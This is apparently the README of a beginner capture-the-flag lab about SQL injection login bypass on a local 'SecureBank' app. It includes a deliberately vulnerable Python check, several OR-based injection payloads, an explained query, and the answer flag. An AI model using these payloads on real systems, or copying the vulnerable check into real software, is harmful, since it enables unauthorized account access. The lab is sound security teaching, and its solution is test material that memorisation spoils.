# Challenge 2: Authentication Bypass (Basic)

## Description
SecureBank claims to have a secure login system, but their developers might have made some mistakes. Can you find a way to bypass their authentication and access the dashboard without knowing valid credentials?

## Objective
Bypass the authentication system and access the dashboard to retrieve the flag.

## Difficulty
⭐ Basic

## Setup
1. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Run the application:
   ```bash
   python app.py
   ```
3. Or use Docker:
   ```bash
   docker-compose up -d
   ```
4. Navigate to `http://localhost:5001`

## Hints
- The hint on the login page suggests trying special characters
- Think about SQL injection and how authentication queries work
- Try using logical operators in your input
- Common SQL injection payloads often use `OR` conditions

## Flag Format
`CTF{...}`

## Solution
<details>
<summary>Click to reveal solution</summary>

This challenge demonstrates a basic SQL injection authentication bypass.

**Vulnerable Code:**
The application checks for single quotes and OR statements in a way that actually enables the bypass:
```python
if "'" in username or "'" in password:
    if " or " in username.lower() or " or " in password.lower():
        session['username'] = username
        return redirect(url_for('dashboard'))
```

**Solution Steps:**
1. In the username field, enter: `admin' or '1'='1`
2. In the password field, enter anything (e.g., `password`)
3. Click Login

**Alternative payloads:**
- Username: `' or 1=1 --`
- Username: `admin' or 'a'='a`
- Username: `anything' or '1'='1`

**Flag:** `CTF{4uth_byp4ss_1s_34sy_w1th_0r}`

### How it works:
The application simulates a vulnerable SQL query like:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

When you input `admin' or '1'='1`, it becomes:
```sql
SELECT * FROM users WHERE username='admin' or '1'='1' AND password='password'
```

Since `'1'='1'` is always true, the OR condition bypasses the authentication.

</details>

## Learning Objectives
- Understanding SQL injection in authentication
- Learning about OR-based authentication bypass
- Recognizing the importance of parameterized queries
- Understanding input validation and sanitization